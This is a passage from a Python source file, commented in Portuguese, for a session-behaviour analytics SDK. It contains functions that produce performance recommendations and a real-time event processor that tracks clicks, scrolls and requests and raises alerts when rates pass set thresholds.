            "Adicionar notificações relevantes",
            "Implementar recursos de ajuda contextual"
        ]
    else:  # Alto
        return [
            "Manter qualidade atual",
            "Considerar recursos avançados",
            "Coletar feedback para melhorias"
        ]


def get_performance_recommendations(level: str, avg_response_time: float) -> List[str]:
    """Recomendações para melhorar performance"""
    recommendations = []
    
    if level == "Ruim":
        recommendations.extend([
            "URGENTE: Investigar gargalos de performance",
            "Revisar infraestrutura e recursos",
            "Implementar cache agressivo",
            "Otimizar consultas de banco de dados"
        ])
    elif level == "Regular":
        recommendations.extend([
            "Implementar cache em endpoints lentos",
            "Otimizar consultas de banco",
            "Revisar código dos endpoints mais usados"
        ])
    elif level == "Boa":
        recommendations.extend([
            "Monitorar tendências de performance",
            "Implementar cache preventivo",
            "Considerar CDN para recursos estáticos"
        ])
    else:  # Excelente
        recommendations.append("Manter padrão atual de excelência")
    
    # Recomendações específicas para tempo de resposta
    if avg_response_time > 1000:
        recommendations.append("Tempos de resposta > 1s são críticos - investigar imediatamente")
    elif avg_response_time > 500:
        recommendations.append("Tempos de resposta > 500ms afetam experiência do usuário")
    elif avg_response_time > 300:
        recommendations.append("Considerar otimizações para reduzir tempo de resposta")
    
    return recommendations


# ============= FUNCIONALIDADES AVANÇADAS =============

class RealTimeEventProcessor:
    """Processador de eventos em tempo real"""
    
    def __init__(self, sdk: SessionBehaviorSDK):
        self.sdk = sdk
        self.alert_thresholds = {
            "high_click_rate": 30,  # cliques por minuto
            "high_request_rate": 60,  # requisições por minuto
            "long_idle_time": 300,  # segundos
            "high_error_rate": 20   # percentual
        }
        self.alerts: List[Dict[str, Any]] = []
    
    def process_event_stream(self, events: List[Dict[str, Any]]):
        """Processa stream de eventos em tempo real"""
        for event_data in events:
            self._check_alerts(event_data)
            
            # Processar evento baseado no tipo
            if event_data.get('type') == 'user_event':
                self._process_user_event(event_data)
            elif event_data.get('type') == 'request_event':
                self._process_request_event(event_data)
    
    def _process_user_event(self, event_data: Dict[str, Any]):
        """Processa evento de usuário"""
        event_type_str = event_data.get('event_type', 'CUSTOM')
        event_type = EventType(event_type_str.lower()) if event_type_str.lower() in [e.value for e in EventType] else EventType.CUSTOM
        
        if event_type == EventType.CLICK:
            self.sdk.track_click(
                session_id=event_data['session_id'],
                element_id=event_data.get('element_id'),
                coordinates=event_data.get('coordinates'),
                page_url=event_data.get('page_url', '')
            )
        elif event_type == EventType.SCROLL:
            self.sdk.track_scroll(
                session_id=event_data['session_id'],
                scroll_position=event_data.get('coordinates', {}),
                page_url=event_data.get('page_url', ''),
                direction=event_data.get('direction', 'unknown')
            )
    
    def _process_request_event(self, event_data: Dict[str, Any]):
        """Processa evento de requisição"""
        method_str = event_data.get('method', 'GET')
        method = HTTPMethod(method_str) if method_str in [m.value for m in HTTPMethod] else HTTPMethod.GET
        
        self.sdk.track_request(
            session_id=event_data['session_id'],
            endpoint=event_data['endpoint'],
            method=method,
            status_code=event_data['status_code'],
            response_time_ms=event_data['response_time_ms'],
            ip_address=event_data.get('ip_address', ''),
            error_message=event_data.get('error_message')
        )
    
    def _check_alerts(self, event_data: Dict[str, Any]):
        """Verifica condições de alerta"""
        session_id = event_data['session_id']
        
        # Verificar alta taxa de cliques
        if event_data.get('type') == 'user_event' and event_data.get('event_type') == 'CLICK':
            behavior_analysis = self.sdk.get_session_behavior_analysis(session_id)
            click_rate = behavior_analysis['click_patterns']['click_frequency_per_minute']
            
            if click_rate > self.alert_thresholds['high_click_rate']:
                self._create_alert("high_click_rate", session_id, 
                                 f"Taxa de cliques elevada: {click_rate:.1f}/min")
        
        # Verificar alta taxa de requisições
        if event_data.get('type') == 'request_event':
            request_metrics = self.sdk.endpoint_monitor.calculate_requests_per_minute(session_id)
            request_rate = request_metrics['requests_per_minute']
            
            if request_rate > self.alert_thresholds['high_request_rate']:
                self._create_alert("high_request_rate", session_id,
                                 f"Taxa de requisições elevada: {request_rate:.1f}/min")
    
    def _create_alert(self, alert_type: str, session_id: str, message: str):
        """Cria um alerta"""
        alert = {
            "id": str(uuid.uuid4()),
            "type": alert_type,
            "session_id": session_id,
            "message": message,
            "timestamp": datetime.now().isoformat(),
            "severity": self._get_alert_severity(alert_type)
        }
        
        self.alerts.append(alert)
        logger.warning(f"ALERTA [{alert['severity']}]: {message}")
    
    def _get_alert_severity(self, alert_type: str) -> str:
        """Determina severidade do alerta"""
        severity_map = {
            "high_click_rate": "medium",
            "high_request_rate": "high", 
            "high_error_rate": "high",
            "long_idle_time": "low"
        }
        return severity_map.get(alert_type, "medium")
    
    def get_active_alerts(self, hours: int = 1) -> List[Dict[str, Any]]:
        """Obtém alertas ativos"""
        cutoff = datetime.now() - timedelta(hours=hours)
        return [alert for alert in self.alerts 
                if datetime.fromisoformat(alert['timestamp']) > cutoff]


# Executar demonstração se o arquivo for executado diretamente
if __name__ == "__main__":
    exemplo_uso_completo()
